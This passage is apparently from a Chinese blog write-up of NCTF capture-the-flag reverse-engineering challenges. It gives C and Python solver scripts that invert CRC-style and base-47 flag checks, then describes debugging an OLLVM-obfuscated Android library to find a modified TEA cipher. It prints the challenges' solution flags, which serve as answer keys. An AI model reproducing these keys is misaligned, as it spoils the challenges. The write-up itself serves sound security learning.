class="number">0xC3</span>, <span class="number">0x1B</span>, <span class="number">0xDF</span>, <span class="number">0x05</span>, <span class="number">0x5A</span>,</span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xEF</span>, <span class="number">0x02</span>, <span class="number">0x2D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> compare[] = &#123;</span><br><span class="line">  <span class="number">0x5E</span>, <span class="number">0x60</span>, <span class="number">0xF6</span>, <span class="number">0xC0</span>, <span class="number">0x0A</span>, <span class="number">0x6E</span>, <span class="number">0xB1</span>, <span class="number">0x00</span>, <span class="number">0xD2</span>, <span class="number">0xA2</span>,</span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0x33</span>, <span class="number">0xB7</span>, <span class="number">0xB7</span>, <span class="number">0xCA</span>, <span class="number">0x57</span>, <span class="number">0x9C</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x9A</span>,</span><br><span class="line">  <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0xD8</span>, <span class="number">0xBD</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0x38</span>, <span class="number">0xD8</span>, <span class="number">0xB3</span>, <span class="number">0x0B</span>,</span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x8D</span>, <span class="number">0xAD</span>, <span class="number">0x0D</span>, <span class="number">0x6B</span>, <span class="number">0x17</span>, <span class="number">0xEF</span>, <span class="number">0xDE</span>, <span class="number">0x5F</span>, <span class="number">0x68</span>,</span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0xF7</span>, <span class="number">0x1F</span>, <span class="number">0x2C</span>, <span class="number">0x96</span>, <span class="number">0x42</span>, <span class="number">0x44</span>, <span class="number">0x6C</span>, <span class="number">0x90</span>, <span class="number">0xFE</span>,</span><br><span class="line">  <span class="number">0x5C</span>, <span class="number">0xA1</span>, <span class="number">0x21</span>, <span class="number">0x87</span>, <span class="number">0xCD</span>, <span class="number">0x20</span>, <span class="number">0xE8</span>, <span class="number">0x7C</span>, <span class="number">0x96</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0x41</span>, <span class="number">0x16</span>, <span class="number">0x2C</span>, <span class="number">0x9A</span>, <span class="number">0x0F</span>, <span class="number">0x2D</span>, <span class="number">0x57</span>, <span class="number">0x2C</span>, <span class="number">0xDC</span>,</span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0xCF</span>, <span class="number">0x7D</span>, <span class="number">0x49</span>, <span class="number">0x50</span>, <span class="number">0x4A</span>, <span class="number">0xBF</span>, <span class="number">0x6A</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD* dword_404A38 = (DWORD*)byte_404A38;</span><br><span class="line">DWORD* dwcompare = (DWORD*)compare;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">40</span>; k+=<span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">32</span>; i &lt; <span class="number">128</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">32</span>; j &lt; <span class="number">128</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">flag[<span class="number">0</span>] = i;</span><br><span class="line">flag[<span class="number">1</span>] = j;</span><br><span class="line"></span><br><span class="line">DWORD dword_404E50 = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">DWORD dword_404E4C = (flag[<span class="number">0</span>] ^ dword_404E50) &amp; <span class="number">0xFF</span>;</span><br><span class="line">dword_404E50 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">dword_404E50 ^= dword_404A38[dword_404E4C];</span><br><span class="line"></span><br><span class="line">dword_404E4C = (flag[<span class="number">1</span>] ^ dword_404E50) &amp; <span class="number">0Xff</span>;</span><br><span class="line">dword_404E50 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">dword_404E50 ^= dword_404A38[dword_404E4C];</span><br><span class="line">dword_404E50 = <span class="number">0xFFFFFFFF</span> - dword_404E50;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dword_404E50 == dwcompare[k/<span class="number">2</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>, i, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag为 <code>NCTF&#123;rLdE57TG0iHA39qUnFZp6LeJyYEBcxMNL7&#125;</code></p><h2 id="狗狗的秘密"><a href="#狗狗的秘密" class="headerlink" title="狗狗的秘密"></a>狗狗的秘密</h2><p><img src="./image-20211128221743368.png" alt="image-20211128221743368"></p><p>前面是47进制，直接用C语言实现上面那个框中的算法，调试，输几个数试试就能试出来了</p><p>先写脚本从下往上把47进制后的flag弄出来，发现有很多种情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">byte_405018 = [</span><br><span class="line">    <span class="number">0x21</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x87</span>, <span class="number">0x09</span>, <span class="number">0x21</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0xA2</span>, <span class="number">0x9B</span>,</span><br><span class="line">    <span class="number">0xF4</span>, <span class="number">0xDF</span>, <span class="number">0xAC</span>, <span class="number">0x7C</span>, <span class="number">0xA1</span>, <span class="number">0xC6</span>, <span class="number">0x16</span>, <span class="number">0xD0</span>, <span class="number">0x0F</span>, <span class="number">0xDD</span>,</span><br><span class="line">    <span class="number">0xDC</span>, <span class="number">0x73</span>, <span class="number">0xC5</span>, <span class="number">0x6B</span>, <span class="number">0xD1</span>, <span class="number">0x96</span>, <span class="number">0x47</span>, <span class="number">0xC2</span>, <span class="number">0x26</span>, <span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x41</span>, <span class="number">0x82</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x9A</span>, <span class="number">0x6E</span>, <span class="number">0x33</span>, <span class="number">0x92</span>, <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x29</span>, <span class="number">0xB5</span>, <span class="number">0xB4</span>, <span class="number">0x71</span>, <span class="number">0xA9</span>, <span class="number">0xCE</span>, <span class="number">0xC3</span>, <span class="number">0x34</span>, <span class="number">0x50</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0xBF</span>, <span class="number">0x2D</span>, <span class="number">0x57</span>, <span class="number">0x22</span>, <span class="number">0xA6</span>, <span class="number">0x30</span>, <span class="number">0x04</span>, <span class="number">0xB2</span>, <span class="number">0xCD</span>, <span class="number">0x36</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0x68</span>, <span class="number">0x4D</span>, <span class="number">0x5B</span>, <span class="number">0x45</span>, <span class="number">0x9E</span>, <span class="number">0x85</span>, <span class="number">0xCF</span>, <span class="number">0x9D</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x78</span>, <span class="number">0x32</span>, <span class="number">0x76</span>, <span class="number">0x31</span>, <span class="number">0xE3</span>, <span class="number">0x80</span>, <span class="number">0xAD</span>, <span class="number">0x39</span>, <span class="number">0x4F</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x72</span>, <span class="number">0x83</span>, <span class="number">0x4C</span>, <span class="number">0x86</span>, <span class="number">0x60</span>, <span class="number">0xB7</span>, <span class="number">0xD7</span>, <span class="number">0x63</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x35</span>, <span class="number">0xB3</span>, <span class="number">0x7B</span>, <span class="number">0x19</span>, <span class="number">0xD4</span>, <span class="number">0x69</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, <span class="number">0x1F</span>,</span><br><span class="line">    <span class="number">0x3D</span>, <span class="number">0x11</span>, <span class="number">0x79</span>, <span class="number">0xD3</span>, <span class="number">0xEE</span>, <span class="number">0x93</span>, <span class="number">0x42</span>, <span class="number">0xDE</span>, <span class="number">0x23</span>, <span class="number">0x3B</span>,</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x8D</span>, <span class="number">0xA5</span>, <span class="number">0x77</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0xDB</span>, <span class="number">0x97</span>, <span class="number">0xF6</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x52</span>, <span class="number">0x15</span>, <span class="number">0x74</span>, <span class="number">0x25</span>, <span class="number">0x62</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0xE8</span>, <span class="number">0x0D</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0x2A</span>, <span class="number">0x43</span>, <span class="number">0xE2</span>, <span class="number">0xEF</span>, <span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0x49</span>, <span class="number">0x1C</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0xA7</span>, <span class="number">0x8A</span>, <span class="number">0x09</span>, <span class="number">0x81</span>, <span class="number">0xE7</span>, <span class="number">0x53</span>, <span class="number">0xAA</span>, <span class="number">0xFF</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x91</span>, <span class="number">0xF1</span>, <span class="number">0xF0</span>, <span class="number">0xA4</span>, <span class="number">0x46</span>, <span class="number">0x3A</span>, <span class="number">0x7D</span>, <span class="number">0x54</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x2F</span>, <span class="number">0xC1</span>, <span class="number">0xC0</span>, <span class="number">0x0E</span>, <span class="number">0xBD</span>, <span class="number">0xE1</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0xBE</span>, <span class="number">0xE4</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x3C</span>, <span class="number">0x5A</span>, <span class="number">0xA8</span>, <span class="number">0x9F</span>, <span class="number">0x37</span>, <span class="number">0xAF</span>, <span class="number">0xA0</span>, <span class="number">0x13</span>, <span class="number">0xED</span>,</span><br><span class="line">    <span class="number">0x1B</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0x3E</span>, <span class="number">0x7E</span>, <span class="number">0x27</span>, <span class="number">0x99</span>, <span class="number">0x75</span>, <span class="number">0xAB</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0xD9</span>, <span class="number">0x3F</span>, <span class="number">0xF3</span>, <span class="number">0xEA</span>, <span class="number">0x70</span>, <span class="number">0xF7</span>, <span class="number">0x95</span>, <span class="number">0xBA</span>, <span class="number">0x1D</span>, <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xB0</span>, <span class="number">0xF9</span>, <span class="number">0xE5</span>, <span class="number">0xF8</span>, <span class="number">0x06</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x2E</span>, <span class="number">0x89</span>, <span class="number">0x5C</span>, <span class="number">0x7F</span>, <span class="number">0xB1</span>, <span class="number">0x1A</span>, <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xAE</span>,</span><br><span class="line">    <span class="number">0xDA</span>, <span class="number">0xE6</span>, <span class="number">0x5E</span>, <span class="number">0xB9</span>, <span class="number">0x84</span>, <span class="number">0xE9</span>, <span class="number">0x55</span>, <span class="number">0xBB</span>, <span class="number">0xC7</span>, <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x66</span>, <span class="number">0xF2</span>, <span class="number">0xD8</span>, <span class="number">0xCB</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0x17</span>, <span class="number">0x94</span>,</span><br><span class="line">    <span class="number">0x6A</span>, <span class="number">0x4A</span>, <span class="number">0x01</span>, <span class="number">0x24</span>, <span class="number">0x14</span>, <span class="number">0x51</span>, <span class="number">0x07</span>, <span class="number">0x65</span>, <span class="number">0x21</span>, <span class="number">0xC8</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0xFD</span>, <span class="number">0x8F</span>, <span class="number">0xC4</span>, <span class="number">0xF5</span>, <span class="number">0xFC</span></span><br><span class="line">]</span><br><span class="line">byte_405118 = [</span><br><span class="line">    <span class="number">0xA7</span>, <span class="number">0x1C</span>, <span class="number">0x7E</span>, <span class="number">0xAF</span>, <span class="number">0xD9</span>, <span class="number">0xC2</span>, <span class="number">0xC0</span>, <span class="number">0xBE</span>, <span class="number">0x1F</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x9A</span>, <span class="number">0x85</span>, <span class="number">0x26</span>, <span class="number">0xE3</span>, <span class="number">0x87</span>, <span class="number">0xC3</span>, <span class="number">0x21</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x35</span>, <span class="number">0xA5</span>, <span class="number">0x1D</span>, <span class="number">0x0D</span>, <span class="number">0x2F</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0xB5</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0x8D</span>, <span class="number">0xDB</span>, <span class="number">0x53</span>, <span class="number">0x3A</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x43</span>, <span class="number">0x99</span>, <span class="number">0x97</span>, <span class="number">0x9D</span>, <span class="number">0xE8</span>, <span class="number">0x49</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">byte_v17 = [<span class="number">0x52</span>, <span class="number">0xC3</span>, <span class="number">0x1A</span>, <span class="number">0xE0</span>, <span class="number">0x16</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0xE2</span>, <span class="number">0x67</span>, <span class="number">0x1F</span>,</span><br><span class="line">            <span class="number">0x1F</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x1F</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>, <span class="number">0xF9</span>, <span class="number">0x06</span>, <span class="number">0x67</span>,</span><br><span class="line">            <span class="number">0x58</span>, <span class="number">0xB2</span>, <span class="number">0xE2</span>, <span class="number">0x8C</span>, <span class="number">0x0F</span>, <span class="number">0x2A</span>, <span class="number">0x06</span>, <span class="number">0x89</span>, <span class="number">0xCF</span>, <span class="number">0x2A</span>,</span><br><span class="line">            <span class="number">0x06</span>, <span class="number">0x1F</span>, <span class="number">0x98</span>, <span class="number">0x1A</span>, <span class="number">0x3E</span>, <span class="number">0x17</span>, <span class="number">0x67</span>, <span class="number">0x1F</span>, <span class="number">0xF7</span>, <span class="number">0x3A</span>,</span><br><span class="line">            <span class="number">0x44</span>, <span class="number">0xC3</span>, <span class="number">0x16</span>, <span class="number">0x33</span>, <span class="number">0x69</span>, <span class="number">0x1A</span>, <span class="number">0x75</span>, <span class="number">0x16</span>, <span class="number">0x3E</span>, <span class="number">0x17</span>,</span><br><span class="line">            <span class="number">0xD5</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x1B</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x3E</span>, <span class="number">0x67</span>, <span class="number">0xF7</span>, <span class="number">0x89</span>,</span><br><span class="line">            <span class="number">0x67</span>]</span><br><span class="line">v11 = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v17 <span class="keyword">in</span> byte_v17:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        c = byte_405018[i] ^ i</span><br><span class="line">        <span class="keyword">if</span> c == v17:</span><br><span class="line">            <span class="comment"># print(hex(i))</span></span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> byte_405118:</span><br><span class="line">                <span class="built_in">print</span>(byte_405118.index(i), end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>索引为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">2     </span><br><span class="line">0     </span><br><span class="line">33 45 </span><br><span class="line">44    </span><br><span class="line">30    </span><br><span class="line">40    </span><br><span class="line">8     </span><br><span class="line">23</span><br><span class="line">22 11 7</span><br><span class="line">37 34</span><br><span class="line">37 34</span><br><span class="line">19 20 43</span><br><span class="line">19 20 43</span><br><span class="line">37 34</span><br><span class="line">24</span><br><span class="line">19 20 43</span><br><span class="line">31 4</span><br><span class="line">29</span><br><span class="line">19 20 43</span><br><span class="line">22 11 7</span><br><span class="line">13</span><br><span class="line">5</span><br><span class="line">23</span><br><span class="line">41</span><br><span class="line">31 4</span><br><span class="line">35</span><br><span class="line">19 20 43</span><br><span class="line">9</span><br><span class="line">14</span><br><span class="line">35</span><br><span class="line">19 20 43</span><br><span class="line">37 34</span><br><span class="line">3</span><br><span class="line">33 45</span><br><span class="line">10</span><br><span class="line">24</span><br><span class="line">22 11 7</span><br><span class="line">37 34</span><br><span class="line">38</span><br><span class="line">1</span><br><span class="line">25</span><br><span class="line">0</span><br><span class="line">30</span><br><span class="line">6</span><br><span class="line">42</span><br><span class="line">33 45</span><br><span class="line">36</span><br><span class="line">30</span><br><span class="line">10</span><br><span class="line">24</span><br><span class="line">21</span><br><span class="line">42</span><br><span class="line">26</span><br><span class="line">28</span><br><span class="line">25</span><br><span class="line">25</span><br><span class="line">10</span><br><span class="line">22 11 7</span><br><span class="line">38</span><br><span class="line">9</span><br><span class="line">22 11 7</span><br></pre></td></tr></table></figure><p>然后写脚本，从一头开始试，因为如果一头稍微一改，打印的字符串前面变化很大的话，说明改对了，因为数据高位一改，整个数字变化才大，然后<code>long_to_bytes</code>后对应的字符也变换很大了，如果从低位改，数据变化不大，<code>long_to_bytes</code>后头部的字符变化也不大了， 就这样一点点改，flag就一点点的显示出来了</p><p>可能描述的有点抽象，举个例子就很容易懂了</p><p><img src="./image-20211129132600731.png" alt="image-20211129132600731"></p><p>对应的解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">compare = [<span class="number">2</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           <span class="number">45</span>,</span><br><span class="line">           <span class="number">44</span>,</span><br><span class="line">           <span class="number">30</span>,</span><br><span class="line">           <span class="number">40</span>,</span><br><span class="line">           <span class="number">8</span>,</span><br><span class="line">           <span class="number">23</span>,</span><br><span class="line">           <span class="number">11</span>,</span><br><span class="line">           <span class="number">37</span>,</span><br><span class="line">           <span class="number">34</span>,</span><br><span class="line">           <span class="number">43</span>,</span><br><span class="line">           <span class="number">43</span>,</span><br><span class="line">           <span class="number">37</span>,</span><br><span class="line">           <span class="number">24</span>,</span><br><span class="line">           <span class="number">19</span>,</span><br><span class="line">           <span class="number">4</span>,</span><br><span class="line">           <span class="number">29</span>,</span><br><span class="line">           <span class="number">19</span>,          <span class="comment"># 19 20 43</span></span><br><span class="line">           <span class="number">22</span>,            <span class="comment"># 22 11 7</span></span><br><span class="line">           <span class="number">13</span>,</span><br><span class="line">           <span class="number">5</span>,</span><br><span class="line">           <span class="number">23</span>,</span><br><span class="line">           <span class="number">41</span>,</span><br><span class="line">           <span class="number">4</span>,           <span class="comment"># 31  4</span></span><br><span class="line">           <span class="number">35</span>,</span><br><span class="line">           <span class="number">20</span>,          <span class="comment"># 19 20 43</span></span><br><span class="line">           <span class="number">9</span>,</span><br><span class="line">           <span class="number">14</span>,</span><br><span class="line">           <span class="number">35</span>,</span><br><span class="line">           <span class="number">43</span>,          <span class="comment"># 19 20 43</span></span><br><span class="line">           <span class="number">37</span>,          <span class="comment"># 37 34</span></span><br><span class="line">           <span class="number">3</span>,</span><br><span class="line">           <span class="number">33</span>,          <span class="comment"># 33 45</span></span><br><span class="line">           <span class="number">10</span>,</span><br><span class="line">           <span class="number">24</span>,</span><br><span class="line">           <span class="number">22</span>,           <span class="comment"># 22 11 7</span></span><br><span class="line">           <span class="number">37</span>,      <span class="comment"># 37 34</span></span><br><span class="line">           <span class="number">38</span>,</span><br><span class="line">           <span class="number">1</span>,</span><br><span class="line">           <span class="number">25</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           <span class="number">30</span>,</span><br><span class="line">           <span class="number">6</span>,</span><br><span class="line">           <span class="number">42</span>,</span><br><span class="line">           <span class="number">45</span>,          <span class="comment"># 33 45</span></span><br><span class="line">           <span class="number">36</span>,</span><br><span class="line">           <span class="number">30</span>,</span><br><span class="line">           <span class="number">10</span>,</span><br><span class="line">           <span class="number">24</span>,</span><br><span class="line">           <span class="number">21</span>,</span><br><span class="line">           <span class="number">42</span>,</span><br><span class="line">           <span class="number">26</span>,</span><br><span class="line">           <span class="number">28</span>,</span><br><span class="line">           <span class="number">25</span>,</span><br><span class="line">           <span class="number">25</span>,</span><br><span class="line">           <span class="number">10</span>,</span><br><span class="line">           <span class="number">7</span>,</span><br><span class="line">           <span class="number">38</span>,</span><br><span class="line">           <span class="number">9</span>,</span><br><span class="line">           <span class="number">11</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">re_compare = compare[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(compare)):</span><br><span class="line">    tmp = re_compare[i] * <span class="built_in">pow</span>(<span class="number">47</span>, i)</span><br><span class="line">    <span class="built_in">sum</span> += tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">sum</span>))</span><br><span class="line"><span class="comment"># NCTF&#123;ADF0E239-D911-3781-7E40-A575A19E5835&#125;</span></span><br></pre></td></tr></table></figure><p>flag为 <code>NCTF&#123;ADF0E239-D911-3781-7E40-A575A19E5835&#125;</code></p><h2 id="easy-mobile"><a href="#easy-mobile" class="headerlink" title="easy_mobile"></a>easy_mobile</h2><p>JEB打开分析</p><p><img src="./image-20211129133043672.png" alt="image-20211129133043672"></p><p>发现check_flag 的算法在对应的so文件里</p><p><img src="./image-20211129133838003.png" alt="image-20211129133838003"></p><p>IDA打开找到<code> Java_com_example_rectf_MainActivity_checkflag</code> 函数</p><p><img src="./image-20211129133146870.png" alt="image-20211129133146870"></p><p>哇塞，看这优美的图形，是OLLVM，从网上找来各种脚本平坦化，要么是失败，要么是去了还不如不去容易看</p><blockquote><p>我一共试了这2个脚本</p><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a> （成功去除，基址设置为0X400000，比如check_flag是0X7900，然后 就运行</p><p><code>python deflat.py -f libnative-lib.so --addr 0x407900</code>，但是去了后我感觉更难看了）</p><p><a href="https://github.com/pcy190/deobfuscator">https://github.com/pcy190/deobfuscator</a> （这个我去除失败，可能是qiling版本的问题）</p></blockquote><p>好吧，直接硬刚OLLVM，真机调试</p><blockquote><p>如何搭建真机调试环境可以参考我写的这篇文章</p><p><a href="https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/">https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/</a></p></blockquote><p><img src="./image-20211129134112254.png" alt="image-20211129134112254"></p><p>在下面每个框中第一条指令下断点，尤其是这种大的块肯定是有用的，先审视一下这种大的块</p><p><img src="./image-20211129134233317.png" alt="image-20211129134233317"></p><p>发现在这个位置调用了strlen，然后与0X18对比 猜测是验证flag的长度，继续审视其他块</p><p><img src="./image-20211129134438579.png" alt="image-20211129134438579"></p><p>在这个位置发现了一些类似密钥的字符串，还调用了一个函数，进入这个<code> sub_7D30F1E260</code> 函数</p><p><img src="./image-20211129134631372.png" alt="image-20211129134631372"></p><p>根据<code>&lt;&lt; 4</code> <code> &gt;&gt;5</code> <code>0X12345678</code>等特征，发现这是一种个TEA算法，delta改为了<code>0X12345678</code></p><p>继续审视，在这个位置发现了一些明文</p><p><img src="./image-20211129134810778.png" alt="image-20211129134810778"></p><p>F5，发现这里还有一些加减乘除的一些操作</p><p><img src="./image-20211129135242278.png" alt="image-20211129135242278"></p><p>开始调试，直接在上面对应的位置下断点，flag先输入12345试试，一点点来到strlen的位置，发现果然是验证flag的长度</p><p><img src="./image-20211129135058075.png" 